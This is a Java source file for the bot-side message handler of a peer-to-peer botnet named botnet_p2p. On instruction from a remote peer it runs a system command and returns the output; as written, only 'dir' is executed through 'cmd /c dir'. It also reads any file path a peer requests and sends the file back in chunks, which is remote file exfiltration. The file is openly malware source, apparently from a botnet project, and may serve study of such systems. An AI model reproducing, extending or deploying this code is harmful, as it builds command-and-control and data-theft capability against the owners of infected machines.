package botnet_p2p.business_logic_layer;

import botnet_p2p.model.KademliaPeer;
import botnet_p2p.p2p_layer.P2pLayer;
import com.google.protobuf.ByteString;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.util.IOUtils;

import java.io.IOException;
import java.io.InputStreamReader;
import java.util.List;
import java.util.UUID;

import static botnet_p2p.MessageOuterClass.Message;


class BotMessageHandler {
    private static final Logger logger = LogManager.getLogger(BusinessLogicLayer.class);
    private static final int CHUNK_SIZE = 128;
    private P2pLayer p2pLayer;
    private KademliaPeer me;

    BotMessageHandler(P2pLayer p2pLayer, KademliaPeer me) {
        this.p2pLayer = p2pLayer;
        this.me = me;
    }

    void handleCommandMessage(Message message) {
        KademliaPeer sender = KademliaPeer.fromContact(message.getSender());
        Message.CommandMsg command = message.getCommand();

        logger.info("executing command: " + command.getCommand());
        String result = executeSystemCommand(command.getCommand());
        boolean success = true;
        if (result == null) {
            result = "";
            success = false;
        }
        if (message.getCommand().getShouldRespond()) {
            p2pLayer.commandResponse(sender, me, result, success);
        }
    }

    void handleCommandResponseMessage(Message messsage) {
        logger.debug("\r\n\r\ncommand response received: \r\n"
                + messsage.getResponse().getValue());
    }

    void handleFileRequestMessage(Message message) {
        KademliaPeer sender = KademliaPeer.fromContact(message.getSender());
        String path = message.getFileRequest().getPath();

        String fileName = getFileName(path);
        FileReader fileReader = new FileReader();
        FileReader.ChunkedFile chunkedFile = fileReader.readFile(path, CHUNK_SIZE);

        List<byte[]> chunks = chunkedFile.chunks;
        for (int i = 0; i < chunks.size(); i++) {
            Message.FileChunkMsg fileChunkMsg = Message.FileChunkMsg.newBuilder()
                    .setUuid(UUID.randomUUID().toString())
                    .setFileName(fileName)
                    .setFileSize(chunkedFile.fileSize)
                    .setOrdinal(i)
                    .setData(ByteString.copyFrom(chunks.get(i)))
                    .build();
            p2pLayer.fileChunk(sender, me, fileChunkMsg);
        }

    }

    public String getFileName(String path) {
        String[] split = null;
        if (path.contains("/")) {
            split = path.split("/");

        } else if (path.contains("\\")) {
            split = path.split("\\\\");
        }
        return split == null ? path : split[split.length - 1];
    }

    String executeSystemCommand(String command) {
        if ("dir".equals(command)) {
            try {
                Process exec = Runtime.getRuntime().exec("cmd /c dir");
                exec.waitFor();
                if (exec.exitValue() != 0) {
                    return null;
                }
                InputStreamReader i = new InputStreamReader(exec.getInputStream());
                return IOUtils.toString(i);
            } catch (IOException | InterruptedException e) {
                e.printStackTrace();
                return null;
            }
        }
        return null;
    }
}
